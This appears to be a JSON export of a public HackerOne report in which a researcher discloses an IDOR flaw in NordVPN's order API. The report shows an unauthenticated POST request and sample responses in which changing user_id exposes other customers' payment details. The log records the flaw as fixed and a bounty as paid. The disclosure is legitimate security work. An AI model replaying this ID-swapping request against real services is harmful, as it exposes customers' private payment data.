{"id":751577,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTE1Nzc=","url":"https://hackerone.com/reports/751577","title":"IDOR allow access to payments data of any user","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-12-04T19:49:45.601Z","submitted_at":"2019-12-04T19:49:45.601Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dakitu","url":"/dakitu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/9owzfY7b67UTh2dZJDZrPyyK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17173,"url":"https://hackerone.com/nordvpn","handle":"nordvpn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/KxF7vPvwgWhQmAsPpFjrK2Eb/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/KxF7vPvwgWhQmAsPpFjrK2Eb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"NordVPN","twitter_handle":"","website":"https://www.nordvpn.com","about":"The world’s most advanced VPN"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-05T02:53:18.633Z","bug_reporter_agreed_on_going_public_at":"2020-01-06T02:53:16.196Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"simple send this POST request (no need any auth):\n\n`POST /api/v1/orders HTTP/1.1\nHost: join.nordvpn.com\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/json\nContent-Length: 179\nDNT: 1\nConnection: close`\n\n`{\"payment\":{\"provider_method_account\":\"6xdxdd\",\"parameters\":{}},\"action\":\"order\",\"plan_id\":653,\"user_id\":20027039,\"tax_country_code\":\"TW\",\"payment_retry\":0,\"is_installment\":false}`\n\nwill respond:\n`{\"id\":42615458,\"user_id\":20027039,\"confirmation\":{\"id\":23093398,\"created_at\":\"2019-12-04 17:01:35\",\"updated_at\":\"2019-12-04 17:01:35\",\"type\":\"redirect_post\",\"value\":\"{\\\"url\\\":\\\"https:\\\\\\/\\\\\\/www.coinpayments.net\\\\\\/index.php\\\",\\\"parameters\\\":{\\\"cmd\\\":\\\"_pay\\\",\\\"reset\\\":1,\\\"email\\\":\\\"█████\\\",\\\"merchant\\\":\\\"e64a9629f9a68cdeab5d0edd21b068d3\\\",\\\"currency\\\":\\\"USD\\\",\\\"amountf\\\":125.64,\\\"item_name\\\":\\\"VPN order\\\",\\\"invoice\\\":\\\"49476958\\\",\\\"success_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/payments\\\\\\/callback\\\\\\/264cae0b89e44a7bd263431b68d1122d\\\",\\\"cancel_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/order\\\\\\/error\\\\\\/?error_alert=payment\u0026eu=1\\\",\\\"want_shipping\\\":0}}\"}}`\n\n\nchange user_id to 23093782 and you will get:\n`{\"id\":42616121,\"user_id\":89495166,\"confirmation\":{\"id\":23093782,\"created_at\":\"2019-12-04 17:16:14\",\"updated_at\":\"2019-12-04 17:16:14\",\"type\":\"redirect\",\"value\":\"https:\\/\\/pay.gocardless.com\\/flow\\/RE000W16X7XH4JCXJZ623MS6H7W316N3\"}}`\n\n\nchange id to 89495247 (my test account) and you will get:\n`{\"id\":42616142,\"user_id\":89495247,\"confirmation\":{\"id\":23093800,\"created_at\":\"2019-12-04 17:16:48\",\"updated_at\":\"2019-12-04 17:16:48\",\"type\":\"redirect_post\",\"value\":\"{\\\"url\\\":\\\"https:\\\\\\/\\\\\\/www.coinpayments.net\\\\\\/index.php\\\",\\\"parameters\\\":{\\\"cmd\\\":\\\"_pay\\\",\\\"reset\\\":1,\\\"email\\\":\\\"hackerhacker@test.pl\\\",\\\"merchant\\\":\\\"e64a9629f9a68cdeab5d0edd21b068d3\\\",\\\"currency\\\":\\\"USD\\\",\\\"amountf\\\":125.64,\\\"item_name\\\":\\\"VPN order\\\",\\\"invoice\\\":\\\"49478089\\\",\\\"success_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/payments\\\\\\/callback\\\\\\/4513bd083a97e1b5c23c69096d89ac80\\\",\\\"cancel_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/order\\\\\\/error\\\\\\/?error_alert=payment\u0026eu=0\\\",\\\"want_shipping\\\":0}}\"}}`\n\n\nJust letting You know that i submited this bug today on support@nordvpn.com from lewiatan~@ cause i wasn't able to report it via hackerone.\n\n## Impact\n\nleak sensitive customer data","vulnerability_information_html":"\u003cp\u003esimple send this POST request (no need any auth):\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ePOST /api/v1/orders HTTP/1.1\u003cbr\u003e\nHost: join.nordvpn.com\u003cbr\u003e\nAccept: application/json\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nContent-Type: application/json\u003cbr\u003e\nContent-Length: 179\u003cbr\u003e\nDNT: 1\u003cbr\u003e\nConnection: close\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{\u0026quot;payment\u0026quot;:{\u0026quot;provider_method_account\u0026quot;:\u0026quot;6xdxdd\u0026quot;,\u0026quot;parameters\u0026quot;:{}},\u0026quot;action\u0026quot;:\u0026quot;order\u0026quot;,\u0026quot;plan_id\u0026quot;:653,\u0026quot;user_id\u0026quot;:20027039,\u0026quot;tax_country_code\u0026quot;:\u0026quot;TW\u0026quot;,\u0026quot;payment_retry\u0026quot;:0,\u0026quot;is_installment\u0026quot;:false}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ewill respond:\u003cbr\u003e\n\u003ccode\u003e{\u0026quot;id\u0026quot;:42615458,\u0026quot;user_id\u0026quot;:20027039,\u0026quot;confirmation\u0026quot;:{\u0026quot;id\u0026quot;:23093398,\u0026quot;created_at\u0026quot;:\u0026quot;2019-12-04 17:01:35\u0026quot;,\u0026quot;updated_at\u0026quot;:\u0026quot;2019-12-04 17:01:35\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;redirect_post\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;{\\\u0026quot;url\\\u0026quot;:\\\u0026quot;https:\\\\\\/\\\\\\/www.coinpayments.net\\\\\\/index.php\\\u0026quot;,\\\u0026quot;parameters\\\u0026quot;:{\\\u0026quot;cmd\\\u0026quot;:\\\u0026quot;_pay\\\u0026quot;,\\\u0026quot;reset\\\u0026quot;:1,\\\u0026quot;email\\\u0026quot;:\\\u0026quot;█████\\\u0026quot;,\\\u0026quot;merchant\\\u0026quot;:\\\u0026quot;e64a9629f9a68cdeab5d0edd21b068d3\\\u0026quot;,\\\u0026quot;currency\\\u0026quot;:\\\u0026quot;USD\\\u0026quot;,\\\u0026quot;amountf\\\u0026quot;:125.64,\\\u0026quot;item_name\\\u0026quot;:\\\u0026quot;VPN order\\\u0026quot;,\\\u0026quot;invoice\\\u0026quot;:\\\u0026quot;49476958\\\u0026quot;,\\\u0026quot;success_url\\\u0026quot;:\\\u0026quot;https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/payments\\\\\\/callback\\\\\\/264cae0b89e44a7bd263431b68d1122d\\\u0026quot;,\\\u0026quot;cancel_url\\\u0026quot;:\\\u0026quot;https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/order\\\\\\/error\\\\\\/?error_alert=payment\u0026amp;eu=1\\\u0026quot;,\\\u0026quot;want_shipping\\\u0026quot;:0}}\u0026quot;}}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003echange user_id to 23093782 and you will get:\u003cbr\u003e\n\u003ccode\u003e{\u0026quot;id\u0026quot;:42616121,\u0026quot;user_id\u0026quot;:89495166,\u0026quot;confirmation\u0026quot;:{\u0026quot;id\u0026quot;:23093782,\u0026quot;created_at\u0026quot;:\u0026quot;2019-12-04 17:16:14\u0026quot;,\u0026quot;updated_at\u0026quot;:\u0026quot;2019-12-04 17:16:14\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;redirect\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;https:\\/\\/pay.gocardless.com\\/flow\\/RE000W16X7XH4JCXJZ623MS6H7W316N3\u0026quot;}}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003echange id to 89495247 (my test account) and you will get:\u003cbr\u003e\n\u003ccode\u003e{\u0026quot;id\u0026quot;:42616142,\u0026quot;user_id\u0026quot;:89495247,\u0026quot;confirmation\u0026quot;:{\u0026quot;id\u0026quot;:23093800,\u0026quot;created_at\u0026quot;:\u0026quot;2019-12-04 17:16:48\u0026quot;,\u0026quot;updated_at\u0026quot;:\u0026quot;2019-12-04 17:16:48\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;redirect_post\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;{\\\u0026quot;url\\\u0026quot;:\\\u0026quot;https:\\\\\\/\\\\\\/www.coinpayments.net\\\\\\/index.php\\\u0026quot;,\\\u0026quot;parameters\\\u0026quot;:{\\\u0026quot;cmd\\\u0026quot;:\\\u0026quot;_pay\\\u0026quot;,\\\u0026quot;reset\\\u0026quot;:1,\\\u0026quot;email\\\u0026quot;:\\\u0026quot;hackerhacker@test.pl\\\u0026quot;,\\\u0026quot;merchant\\\u0026quot;:\\\u0026quot;e64a9629f9a68cdeab5d0edd21b068d3\\\u0026quot;,\\\u0026quot;currency\\\u0026quot;:\\\u0026quot;USD\\\u0026quot;,\\\u0026quot;amountf\\\u0026quot;:125.64,\\\u0026quot;item_name\\\u0026quot;:\\\u0026quot;VPN order\\\u0026quot;,\\\u0026quot;invoice\\\u0026quot;:\\\u0026quot;49478089\\\u0026quot;,\\\u0026quot;success_url\\\u0026quot;:\\\u0026quot;https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/payments\\\\\\/callback\\\\\\/4513bd083a97e1b5c23c69096d89ac80\\\u0026quot;,\\\u0026quot;cancel_url\\\u0026quot;:\\\u0026quot;https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/order\\\\\\/error\\\\\\/?error_alert=payment\u0026amp;eu=0\\\u0026quot;,\\\u0026quot;want_shipping\\\u0026quot;:0}}\u0026quot;}}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eJust letting You know that i submited this bug today on \u003ca title=\"support@nordvpn.com\" href=\"mailto:support@nordvpn.com\" rel=\"nofollow noopener noreferrer\"\u003esupport@nordvpn.com\u003c/a\u003e from lewiatan~@ cause i wasn\u0026#39;t able to report it via hackerone.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eleak sensitive customer data\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-02-05T02:53:16.255Z","allow_singular_disclosure_after":-28353185.90813273,"singular_disclosure_allowed":true,"vote_count":318,"voters":["kryword","sturedman","keshavkejriwal","secator","a_d_a_m","mashoud1122","bogdantcaciuc","spam404","dakitu","base_64","and 308 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":39380,"asset_type":"URL","asset_identifier":"*.nordvpn.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6486744,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-06T20:34:17.224Z","updated_at":"2019-12-06T20:34:17.224Z","actor":{"username":"emanu","cleared":false,"url":"/emanu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordvpn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6486747,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello foo bar,\n\nthanks for your report. We fixed the issue.","markdown_message":"\u003cp\u003eHello foo bar,\u003c/p\u003e\n\n\u003cp\u003ethanks for your report. We fixed the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-06T20:34:54.625Z","updated_at":"2019-12-06T20:34:54.625Z","actor":{"username":"emanu","cleared":false,"url":"/emanu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordvpn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6487567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm that its fixed!","markdown_message":"\u003cp\u003eI can confirm that its fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-06T23:21:30.782Z","updated_at":"2019-12-06T23:21:30.782Z","actor":{"username":"dakitu","cleared":false,"url":"/dakitu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9owzfY7b67UTh2dZJDZrPyyK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordvpn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6489348,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. We appreciate your report very much.","markdown_message":"\u003cp\u003eThanks again. We appreciate your report very much.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-07T08:47:20.958Z","updated_at":"2019-12-07T08:47:20.958Z","actor":{"url":"/nordvpn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KxF7vPvwgWhQmAsPpFjrK2Eb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"NordVPN"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nordvpn","collaborator":{"username":"dakitu","url":"/dakitu"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6489349,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-07T08:47:32.174Z","updated_at":"2019-12-07T08:47:32.174Z","actor":{"username":"emanu","cleared":false,"url":"/emanu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"dakitu","url":"/dakitu"},"genius_execution_id":null,"team_handle":"nordvpn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6695290,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-06T02:53:16.218Z","updated_at":"2020-01-06T02:53:16.218Z","first_to_agree":true,"actor":{"username":"dakitu","cleared":false,"url":"/dakitu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9owzfY7b67UTh2dZJDZrPyyK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordvpn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6756701,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we publish it?","markdown_message":"\u003cp\u003eCan we publish it?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-13T15:04:52.591Z","updated_at":"2020-01-13T15:04:52.591Z","actor":{"username":"dakitu","cleared":false,"url":"/dakitu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9owzfY7b67UTh2dZJDZrPyyK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordvpn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6965294,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-05T02:53:18.663Z","updated_at":"2020-02-05T02:53:18.663Z","actor":{"url":"/nordvpn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KxF7vPvwgWhQmAsPpFjrK2Eb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"NordVPN"}},"genius_execution_id":null,"team_handle":"nordvpn","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}